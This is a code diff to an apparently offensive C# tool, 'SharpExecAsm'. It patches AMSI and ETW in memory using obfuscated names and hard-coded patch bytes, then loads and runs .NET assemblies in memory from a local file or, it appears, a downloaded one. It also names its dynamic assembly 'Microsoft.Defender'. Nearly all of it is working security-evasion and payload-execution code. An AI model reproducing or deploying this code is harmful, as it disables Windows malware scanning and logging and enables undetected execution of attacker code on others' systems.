@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.IO;
 using System.Linq;
 using System.Net;
@@ -16,14 +16,20 @@ namespace execute_assembly
             {
                 IntPtr lib = dLoadLib(Dec("114126132122063117125125"));
                 IntPtr addr = dGetProcA(lib, Dec("082126132122100116114127083134119119118131"));
+                
+                // win10
                 //addr = IntPtr.Add(addr, 0x95);
 
                 UInt32 dwOld = 0;
 
-                if (dVirtualP(addr, (UInt32)0x3, 0x40, ref dwOld))
+                if (dVirtualP(addr, (UInt32)0x3, 0x04, ref dwOld))
                 {
+                    // win10
                     //byte[] patch = new byte[] { 0x75 };
+                    
+                    // win11
                     byte[] patch = new byte[] { 0xb8, 0x34, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3 };
+                    
                     Marshal.Copy(patch, 0, addr, patch.Length);
                     dVirtualP(addr, (UInt32)0x3, 0x20, ref dwOld);
 
@@ -64,9 +70,6 @@ namespace execute_assembly
 
         static void DynamicAssemblyLoader(byte[] asm, string args = null)
         {
-            // DynamicAssemblyLoader: A DotNet Assembly Loader using a Dynamic Method and Emitted MSIL Instructions
-            // Author: @bohops
-
             object obj = new object();
             object[] objArr = new object[] {  };
 
@@ -81,7 +84,8 @@ namespace execute_assembly
                 objArr = new object[] { assemblyArgs };
             }
 
-            //Load and invoke the assembly
+            // DynamicAssemblyLoader: A DotNet Assembly Loader using a Dynamic Method and Emitted MSIL Instructions
+            // Author: @bohops
             DynamicMethod dynamicMethod = new DynamicMethod("_Invoke", typeof(void), new Type[] { typeof(byte[]), typeof(object), typeof(object[]) });
             ILGenerator iLGenerator = dynamicMethod.GetILGenerator();
             iLGenerator.Emit(OpCodes.Ldarg_0);
@@ -132,10 +136,10 @@ namespace execute_assembly
         {
             if (!p4ms1() || !p3tw())
             {
-                Console.Error.WriteLine($"[!] 4MS1/3TW Error: {Marshal.GetLastWin32Error()}");
+                Console.Error.WriteLine($"* 4MS1/3TW Error: {Marshal.GetLastWin32Error()}");
                 return;
             }
-            Console.WriteLine("[+] 4MS1/3TW Patched");
+            Console.WriteLine("+ 4MS1/3TW Patched");
 
             string[] lines = File.ReadAllLines(path);
             byte[] fileBytes = lines.Select(line => byte.Parse(line)).ToArray();
@@ -147,10 +151,10 @@ namespace execute_assembly
         {
             if (!p4ms1() || !p3tw())
             {
-                Console.Error.WriteLine($"[!] 4MS1/3TW Error: {Marshal.GetLastWin32Error()}");
+                Console.WriteLine("* 4MS1/3TW Error");
                 return;
             }
-            Console.WriteLine("[+] 4MS1/3TW Patched");
+            Console.WriteLine("+ 4MS1/3TW Patched");
 
             string file;
             using (var client = new WebClient())
@@ -184,7 +188,7 @@ namespace execute_assembly
 
         public static void Main(string[] args)
         {
-            Console.WriteLine("[+]>");
+            Console.WriteLine("\n     --++  SharpExecAsm  ++-- \n");
 
             if (args.Length == 2 && args[0] is "local")
             {
@@ -211,9 +215,8 @@ namespace execute_assembly
         }
 
         // https://bohops.com/2022/04/02/unmanaged-code-execution-with-net-dynamic-pinvoke/
-
         public static object DynamicPInvokeBuilder(Type type, string library, string method, Object[] args, Type[] paramTypes)
-        {
+        {   
             AssemblyName assemblyName = new AssemblyName("Microsoft.Defender");
             var assemblyBuilder = AssemblyBuilder.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
             var moduleBuilder = assemblyBuilder.DefineDynamicModule("Microsoft.Defender", false);
